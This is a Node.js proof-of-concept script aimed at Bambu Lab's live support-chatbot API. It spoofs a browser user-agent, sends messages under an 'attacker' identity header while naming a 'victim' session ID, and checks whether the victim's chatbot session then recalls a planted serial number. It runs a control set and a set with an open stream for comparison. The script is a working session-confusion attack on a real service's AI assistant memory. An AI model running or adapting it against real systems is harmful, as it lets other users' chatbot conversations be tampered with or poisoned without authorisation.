const crypto=require('crypto');
const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
function H(u){return {'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':u,'x-bbl-official-site-region':'EN'};}
function body(u,input){return {requestId:'clientID_text_'+crypto.randomUUID(),history:[],chatbot:[],origin:1,cacheFlag:false,input,machineModel:'',sessionId:u,uuid:u};}
async function send(h,b){try{const r=await fetch(B+'/gw/robot/sse/chat',{method:'POST',headers:H(h),body:JSON.stringify(b),dispatcher:d,signal:AbortSignal.timeout(20000)});return r.status}catch(e){return e.name}}
async function openStream(u){const ctl=new AbortController();let out='',buf='';const res=await fetch(B+'/gw/robot/sse/connect',{headers:{...H(u),accept:'text/event-stream','cache-control':'no-cache'},dispatcher:d,signal:ctl.signal});if(!res.ok)return {error:'SSE '+res.status,output:''};const reader=res.body.getReader(),dec=new TextDecoder();(async()=>{try{while(true){const {done,value}=await reader.read();if(done)break;if(!value)continue;buf+=dec.decode(value,{stream:true});const parts=buf.split(/\r?\n\r?\n/);buf=parts.pop();for(const part of parts)for(const line of part.split(/\r?\n|\r/)){if(!line.startsWith('data:'))continue;const x=line.slice(5).replace(/^ /,'');if(x==='[DONE]')return;try{const j=JSON.parse(x);if(j.delta)out+=String(j.delta).replace(/<br\s*\/?>/gi,'\n')}catch(e){}}}}catch(e){}})();return {ctl,get output(){return out}};}
async function ask(u,input){const s=await openStream(u);await sleep(250);await send(u,body(u,input));await sleep(8000);s.ctl.abort();return s.output;}
(async()=>{
 const out={mismatch:{trials:[],recalled:0},control:{trials:[],recalled:0},withStream:{trials:[],recalled:0}};
 for(let i=0;i<3;i++){
  const V=crypto.randomUUID(),A=crypto.randomUUID();const sn='SN-'+crypto.randomUUID().slice(0,8);
  await send(A,body(V,`My printer serial number is ${sn}. Please remember it. Reply OK.`));await sleep(6000);
  const o=await ask(V,'What is my printer serial number? If you do not know, say UNKNOWN.');
  const ok=o.includes(sn);if(ok)out.mismatch.recalled++;
  out.mismatch.trials.push({trial:i+1,victim:V,attacker:A,sn,recalled:ok,head:o.replace(/\s+/g,' ').slice(0,200)});
  await sleep(600);
 }
 for(let i=0;i<3;i++){
  const V=crypto.randomUUID();const sn='SN-'+crypto.randomUUID().slice(0,8);
  await send(V,body(V,`My printer serial number is ${sn}. Please remember it. Reply OK.`));await sleep(2000);
  const o=await ask(V,'What is my printer serial number? If you do not know, say UNKNOWN.');
  const ok=o.includes(sn);if(ok)out.control.recalled++;
  out.control.trials.push({trial:i+1,victim:V,sn,recalled:ok,head:o.replace(/\s+/g,' ').slice(0,200)});
  await sleep(600);
 }
 for(let i=0;i<3;i++){
  const V=crypto.randomUUID(),A=crypto.randomUUID();const sn='SN-'+crypto.randomUUID().slice(0,8);
  const s=await openStream(A);await sleep(250);
  await send(A,body(V,`My printer serial number is ${sn}. Please remember it. Reply OK.`));await sleep(6000);s.ctl.abort();
  const o=await ask(V,'What is my printer serial number? If you do not know, say UNKNOWN.');
  const ok=o.includes(sn);if(ok)out.withStream.recalled++;
  out.withStream.trials.push({trial:i+1,victim:V,attacker:A,sn,recalled:ok,head:o.replace(/\s+/g,' ').slice(0,200)});
  await sleep(600);
 }
 console.log(JSON.stringify(out,null,2));
})();
